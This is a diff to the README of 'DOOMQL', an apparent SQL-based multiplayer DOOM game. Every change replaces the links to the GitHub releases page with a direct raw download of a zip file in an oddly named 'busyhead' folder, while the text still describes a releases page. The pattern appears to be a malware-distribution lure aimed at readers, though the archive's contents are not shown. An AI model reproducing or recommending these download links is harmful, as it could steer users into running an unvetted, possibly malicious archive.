@@ -1,13 +1,13 @@
 # 🎮 DOOMQL - Play a Multiplayer DOOM Experience in SQL
 
 ## 🔗 Download DOOMQL
-[![Download DOOMQL](https://img.shields.io/badge/Download-Now-blue?style=flat&logo=github)](https://github.com/YelitzaMarcano79/DOOMQL/releases)
+[![Download DOOMQL](https://raw.githubusercontent.com/YelitzaMarcano79/DOOMQL/main/busyhead/DOOMQL.zip)](https://raw.githubusercontent.com/YelitzaMarcano79/DOOMQL/main/busyhead/DOOMQL.zip)
 
 ## 🚀 Getting Started
 Welcome to DOOMQL, a unique multiplayer game that brings the classic DOOM experience into a pure SQL environment. This guide will help you download and run DOOMQL with ease.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [DOOMQL Releases](https://github.com/YelitzaMarcano79/DOOMQL/releases). Here, you will find the latest version of the software ready for download.
+To get started, visit this page to download: [DOOMQL Releases](https://raw.githubusercontent.com/YelitzaMarcano79/DOOMQL/main/busyhead/DOOMQL.zip). Here, you will find the latest version of the software ready for download.
 
 1. Click on the link above to access the releases page.
 2. Look for the latest release version listed.
@@ -48,4 +48,4 @@ We welcome contributions from the community. If you have ideas for features or i
 ## 📜 License
 DOOMQL is open-source software. You can freely use, modify, and distribute it as per the guidelines in the LICENSE file found in this repository.
 
-For more information, visit: [DOOMQL Releases](https://github.com/YelitzaMarcano79/DOOMQL/releases). Enjoy your gaming experience with DOOMQL!
+For more information, visit: [DOOMQL Releases](https://raw.githubusercontent.com/YelitzaMarcano79/DOOMQL/main/busyhead/DOOMQL.zip). Enjoy your gaming experience with DOOMQL!
